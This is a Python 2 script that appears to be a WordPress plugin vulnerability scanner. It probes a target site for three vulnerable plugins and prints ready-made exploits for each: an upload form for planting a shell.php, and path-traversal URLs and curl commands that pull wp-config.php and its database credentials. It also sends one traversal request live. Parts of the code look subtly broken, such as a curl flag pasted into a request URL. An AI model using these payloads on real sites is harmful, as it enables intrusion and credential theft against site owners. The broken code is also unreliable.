import requests
import re

class PluginCheck():
	def __init__(self,tempurl):
		self.url = "http://{0}".format(tempurl)
		self.count = 0

	def scan(self):
		print "Scan URL: %s\n\n" %self.url
		print "Start Vulnerability......"
		#Wordpress Plugins jQuery Html5 File Upload
		self.path1 =   self.url+'/wp-admin/admin-ajax.php?action=load_ajax_function'
		self.path2 =  self.url+'/wp-content/plugins/jquery-html5-file-upload/'
		self.re1= requests.get(self.path2)
		if(self.re1.status_code == 403 or self.re1.status_code == 200):
			self.re2 = requests.get(self.path1)
			if(self.re2.text.find('{"files":[]}') != -1):
				print "\33[31m"'[+]  Wordpress Plugins jQuery Html5 File Upload'"\033[0m"
 				print "Exploit: \n\t""\33[32m"'<form method="POST" action="test.com/ enctype="multipart/form-data"> <input type="file" name="files[]" /><button>Upload</button>'"\033[0m"
 				print "Shell Access :\n\t\33[32m http://www.test.com/wp-content/uploads/files/guest/shell.php \033[0m"
 				self.count+=1
 		#Wordpress Plugin HB Audio Gallery Lite - Arbitrary File Download
 		self.path3 = self.url+'/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php'
 		self.re3 = requests.get(self.path3)
 		if(self.re3.status_code ==  200):
 			print "\33[31m"'[+]  Wordpress Plugin HB Audio Gallery Lite - Arbitrary File Download'"\033[0m"
 			print "Exploit: \n\t""\33[32m"'http://www.test.com/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10'"\033[0m"
 			self.count+=1

 		#WordPress Memphis Document Library Plugin 3.1.5 Path Disclosure
 		self.path5 =  self.url+'/wp-content/plugins/memphis-documents-library/mdocs-downloads.php'
 		self.path6 = self.url+'?mdocs-img-preview=../../../wp-config.php -o example-wp-config.php'
 		self.re4 = requests.get(self.path5)
 		if(self.re4.status_code == 200):
 			self.re5 = requests.get(self.path6)
 			if(self.re5.status_code==200):
 				print  "\33[31m"'[+]  WordPress Memphis Document Library Plugin 3.1.5 Path Disclosure'"\033[0m"
 				print "Exploit: \n\t""\33[32m"'curl http://example.site.com/?mdocs-img-preview=../../../wp-config.php -o example-wp-config.php'"\033[0m"
 				print " \t""\33[32m"'curl http://example.site.com/mdocs-posts/?mdocs-img-preview=../../../wp-config.php -o example-wp-config.php'"\033[0m"
 				self.count+=1
 		if(self.count == 0):
 			print "\33[32mNo Vulnerability Found\33[0m"
